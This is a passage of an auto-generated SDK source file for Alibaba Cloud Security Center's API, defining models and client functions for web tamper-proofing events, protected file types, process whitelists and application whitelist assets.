> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the names of assets.', example='test-ecs'),
  tsBegin?: long(name='TsBegin', description='The beginning of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
  tsEnd?: long(name='TsEnd', description='The end of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
}

model DescribeWebLockFileEventsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  list?: [ 
    {
      count?: long(name='Count', description='The number of attempts.', example='10'),
      ds?: long(name='Ds', description='The timestamp at which the event on web tamper proofing was first detected.', example='1657178400000'),
      eventName?: string(name='EventName', description='The name of the event on web tamper proofing.', example='modify'),
      eventStatus?: string(name='EventStatus', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      eventType?: string(name='EventType', description='The prevention mode. Valid values:

*   **audit**: Interception Mode
*   **web_lock**: Alert Mode', example='audit'),
      gmtEvent?: long(name='GmtEvent', description='The timestamp at which the event on web tamper proofing was last detected.', example='1657178400000'),
      id?: long(name='Id', description='The ID of the event on web tamper proofing.', example='3555953980'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.25.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the asset.', example='8.210.XX.XX'),
      level?: string(name='Level', description='The severity of the event on web tamper proofing. Valid values: **medium**', example='medium'),
      path?: string(name='Path', description='The file path.', example='D:\\\\test-tamper-proofing\\\\123.html'),
      processName?: string(name='ProcessName', description='The name of the process.', example='python3.7'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='C:\\\\Windows\\\\explorer.exe'),
      status?: string(name='Status', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing returned.', example='100'),
}

model DescribeWebLockFileEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockFileEventsResponseBody(name='body'),
}

/**
 * @summary Queries events on web tamper proofing.
 *
 * @param request DescribeWebLockFileEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockFileEventsResponse
 */
async function describeWebLockFileEventsWithOptions(request: DescribeWebLockFileEventsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.tsBegin)) {
    query['TsBegin'] = request.tsBegin;
  }
  if (!Util.isUnset(request.tsEnd)) {
    query['TsEnd'] = request.tsEnd;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries events on web tamper proofing.
 *
 * @param request DescribeWebLockFileEventsRequest
 * @return DescribeWebLockFileEventsResponse
 */
async function describeWebLockFileEvents(request: DescribeWebLockFileEventsRequest): DescribeWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileEventsWithOptions(request, runtime);
}

model DescribeWebLockFileTypeSummaryResponseBody = {
  list?: [ 
    {
      count?: int32(name='Count', description='The number of attempts.', example='3'),
      type?: string(name='Type', description='The type of the protected file. Valid values:

*   **php**: PHP file
*   **jsp**: JSP file
*   **asp**: ASP file
*   **aspx**: ASPX file
*   **js**: JS file
*   **cgi**: CGI file
*   **html**: HTML file
*   **htm**: HTM file
*   **xml**: XML file
*   **shtml**: SHTML file
*   **shtm**: SHTM file
*   **jpg**: JPG file
*   **gif**: GIF file
*   **png**: PNG file', example='jsp'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BB99533-4FDC-5B9C-A5E4-5AE3E9BE5C78'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing.', example='639'),
}

model DescribeWebLockFileTypeSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockFileTypeSummaryResponseBody(name='body'),
}

/**
 * @summary The number of attempts.
 *
 * @param request DescribeWebLockFileTypeSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockFileTypeSummaryResponse
 */
async function describeWebLockFileTypeSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockFileTypeSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileTypeSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The number of attempts.
 *
 * @return DescribeWebLockFileTypeSummaryResponse
 */
async function describeWebLockFileTypeSummary(): DescribeWebLockFileTypeSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileTypeSummaryWithOptions(runtime);
}

model DescribeWebLockInclusiveFileTypeResponseBody = {
  inclusiveFileType?: [ string ](name='InclusiveFileType', description='An array that consists of the types of files that can be protected by web tamper proofing.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', description='The total number of the types of files that can be protected by web tamper proofing.', example='15'),
}

model DescribeWebLockInclusiveFileTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockInclusiveFileTypeResponseBody(name='body'),
}

/**
 * @summary Queries the types of files that can be protected by web tamper proofing.
 *
 * @param request DescribeWebLockInclusiveFileTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockInclusiveFileTypeResponse
 */
async function describeWebLockInclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockInclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockInclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the types of files that can be protected by web tamper proofing.
 *
 * @return DescribeWebLockInclusiveFileTypeResponse
 */
async function describeWebLockInclusiveFileType(): DescribeWebLockInclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockInclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockProcessBlockStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeWebLockProcessBlockStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', description='The number of processes that are returned on the current page.', example='20'),
      process?: string(name='Process', description='The process.', example='cron'),
    }
  ](name='List', description='An array consisting of the statistics on processes.'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='100'),
}

model DescribeWebLockProcessBlockStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockProcessBlockStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on processes for web tamper proofing.
 *
 * @param request DescribeWebLockProcessBlockStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockProcessBlockStatisticsResponse
 */
async function describeWebLockProcessBlockStatisticsWithOptions(request: DescribeWebLockProcessBlockStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessBlockStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessBlockStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on processes for web tamper proofing.
 *
 * @param request DescribeWebLockProcessBlockStatisticsRequest
 * @return DescribeWebLockProcessBlockStatisticsResponse
 */
async function describeWebLockProcessBlockStatistics(request: DescribeWebLockProcessBlockStatisticsRequest): DescribeWebLockProcessBlockStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessBlockStatisticsWithOptions(request, runtime);
}

model DescribeWebLockProcessListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='cron'),
  status?: int32(name='Status', description='Specifies whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0'),
}

model DescribeWebLockProcessListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: string(name='Count', description='The number of entries returned on the current page.', example='33'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='test_ecs'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      processName?: string(name='ProcessName', description='The name of the process.', example='cron'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='/usr/sbin/cron'),
      status?: int32(name='Status', description='Indicates whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of details about the process.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='200'),
}

model DescribeWebLockProcessListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockProcessListResponseBody(name='body'),
}

/**
 * @summary Queries the processes for web tamper proofing.
 *
 * @param request DescribeWebLockProcessListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockProcessListResponse
 */
async function describeWebLockProcessListWithOptions(request: DescribeWebLockProcessListRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the processes for web tamper proofing.
 *
 * @param request DescribeWebLockProcessListRequest
 * @return DescribeWebLockProcessListResponse
 */
async function describeWebLockProcessList(request: DescribeWebLockProcessListRequest): DescribeWebLockProcessListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessListWithOptions(request, runtime);
}

model DescribeWebLockStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='221.214.XXX.XX'),
}

model DescribeWebLockStatusResponseBody = {
  authCount?: int32(name='AuthCount', description='The total quota that you purchase for web tamper proofing.', example='32'),
  bindCount?: int32(name='BindCount', description='The associated tamper proofing quota.', example='2'),
  blockCount?: int32(name='BlockCount', description='The number of blocked processes.', example='48'),
  dirCount?: int32(name='DirCount', description='The number of protected directories.', example='2'),
  expireTime?: long(name='ExpireTime', description='The timestamp generated when the quota for tamper proofing expires. Unit: millisecond.', example='1688090851000'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  whiteCount?: int32(name='WhiteCount', description='The number of processes in the whitelist.', example='6'),
}

model DescribeWebLockStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockStatusResponseBody(name='body'),
}

/**
 * @summary Queries the status of web tamper proofing.
 *
 * @param request DescribeWebLockStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockStatusResponse
 */
async function describeWebLockStatusWithOptions(request: DescribeWebLockStatusRequest, runtime: Util.RuntimeOptions): DescribeWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status of web tamper proofing.
 *
 * @param request DescribeWebLockStatusRequest
 * @return DescribeWebLockStatusResponse
 */
async function describeWebLockStatus(request: DescribeWebLockStatusRequest): DescribeWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockStatusWithOptions(request, runtime);
}

model DescribeWebLockTotalFileChangeCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
  totalCount?: long(name='TotalCount', description='The number of times that the files protected by web tamper proofing are changed.', example='200'),
}

model DescribeWebLockTotalFileChangeCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockTotalFileChangeCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of times that the files protected by web tamper proofing are changed.
 *
 * @param request DescribeWebLockTotalFileChangeCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockTotalFileChangeCountResponse
 */
async function describeWebLockTotalFileChangeCountWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockTotalFileChangeCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockTotalFileChangeCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of times that the files protected by web tamper proofing are changed.
 *
 * @return DescribeWebLockTotalFileChangeCountResponse
 */
async function describeWebLockTotalFileChangeCount(): DescribeWebLockTotalFileChangeCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockTotalFileChangeCountWithOptions(runtime);
}

model DescribeWebPathRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  type?: string(name='Type', description='The type of the alert configuration. Valid values:

*   **web_path**', example='web_path'),
}

model DescribeWebPathResponseBody = {
  configList?: [ 
    {
      targetList?: [ 
        {
          target?: string(name='Target', description='The object.', example='82048187-bb9b-4e19-8320-7b4ddb97****'),
          targetType?: string(name='TargetType', description='The object type. Valid values:

*   **uuid**', example='uuid'),
        }
      ](name='TargetList', description='An array consisting of the servers on which the web directories are scanned.'),
      webPath?: string(name='WebPath', description='The path to the web directory.', example='/root/www****'),
      webPathType?: string(name='WebPathType', description='The path type of the web directory. Valid values:

*   **def**: automatically identified
*   **customize**: manually added', example='def'),
    }
  ](name='ConfigList', description='An array that consists of the paths to the web directories.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B37C9052-A73E-4707-A024-92477028****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
}

model DescribeWebPathResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebPathResponseBody(name='body'),
}

/**
 * @summary Queries the custom web directories that are scanned based on the alerting feature.
 *
 * @param request DescribeWebPathRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebPathResponse
 */
async function describeWebPathWithOptions(request: DescribeWebPathRequest, runtime: Util.RuntimeOptions): DescribeWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the custom web directories that are scanned based on the alerting feature.
 *
 * @param request DescribeWebPathRequest
 * @return DescribeWebPathResponse
 */
async function describeWebPath(request: DescribeWebPathRequest): DescribeWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebPathWithOptions(request, runtime);
}

model DescribeWhiteListAssetRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  lastMaxId?: long(name='LastMaxId', description='The maximum asset ID of the most recent query.', example='1001'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: **500**. Default value: **500**. This value indicates that 500 entries are displayed on each page.

This parameter is required.', example='20'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='180.119.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.', example='2730'),
  type?: int32(name='Type', description='The policy type of the asset that you want to query. Valid values:

*   **1**: learning policy
*   **2**: application policy

This parameter is required.', example='1'),
}

model DescribeWhiteListAssetResponseBody = {
  assets?: [ 
    {
      allowSelected?: int32(name='AllowSelected', description='Indicates whether the server can be selected. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      groupId?: long(name='GroupId', description='The group ID of the server.', example='11028551'),
      id?: long(name='Id', description='The ID of the server.', example='1001'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='121.41.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='test'),
      selected?: int32(name='Selected', description='Indicates whether the server is selected. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='5c081b02-f66a-47a4-bd2f-79ee3eaf806a'),
    }
  ](name='Assets', description='The information about the servers.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
}

model DescribeWhiteListAssetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListAssetResponseBody(name='body'),
}

/**
 * @summary Queries the information about servers that can be added or are added to application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListAssetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListAssetResponse
 */
async function describeWhiteListAssetWithOptions(request: DescribeWhiteListAssetRequest, runtime: Util.RuntimeOptions): DescribeWhiteListAssetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.lastMaxId)) {
    query['LastMaxId'] = request.lastMaxId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListAsset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about servers that can be added or are added to application whitelist policies.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListAssetRequest
 * @return DescribeWhiteListAssetResponse
 */
async function describeWhiteListAsset(request: DescribeWhiteListAssetRequest): DescribeWhiteListAssetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListAssetWithOptions(request, runtime);
}

model DescribeWhiteListAuthorizeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='180.119.XX.XX'),
}

model DescribeWhiteListAuthorizeResponseBody = {
  availableAuthorizeNum?: int32(name='AvailableAuthorizeNum', description='The available quota.', example='3'),
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model DescribeWhiteListAuthorizeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWhiteListAuthorizeResponseBody(name='body'),
}

/**
 * @summary Queries the available quota for the application whitelist feature.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListAuthorizeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWhiteListAuthorizeResponse
 */
async function describeWhiteListAuthorizeWithOptions(request: DescribeWhiteListAuthorizeRequest, runtime: Util.RuntimeOptions): DescribeWhiteListAuthorizeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWhiteListAuthorize',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the available quota for the application whitelist feature.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request DescribeWhiteListAuthorizeRequest
 * @return DescribeWhiteListAuthorizeResponse
 */
async function describeWhiteListAuthorize(request: DescribeWhiteListAuthorizeRequest): DescribeWhiteListAuthorizeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWhiteListAuthorizeWithOptions(request, runtime);
}

model DescribeWhiteListEffectiveAssetsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  needStatistics?: int32(name='NeedStatistics', description='Specifies whether to return the number of **untrusted programs**. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: **1000**. Default value: 20. If you leave this parameter empty, 20 data entries are returned per page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  remark?: string(name='Remark', description='The condition that is used to query assets. You can enter an IP address, a public IP address, an private IP address, or an asset name for fuzzy match.', example='222.185.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='27.212.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.', example='8437592'),
}

model DescribeWhiteListEffectiveAssetsResponseBody = {
  assets?: [ 
    {
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='60.205.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='192.168.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='test'),
      processMethod?: int32(name='ProcessMethod', description='The exception handling mode. Valid values:

*   **0**: unhandled
*   **1**: alerted
*   **2**: blocked', example='1'),
      strategyId?: long(name='StrategyId', description='The ID of the policy.', example='35815387'),
      strategyName?: string(name='StrategyName', description='The name of the policy.', example='test'),
      suspiciousEventCount?: int32(name='SuspiciousEventCount', description='The number of **untrusted programs** on the server.', example='5'),
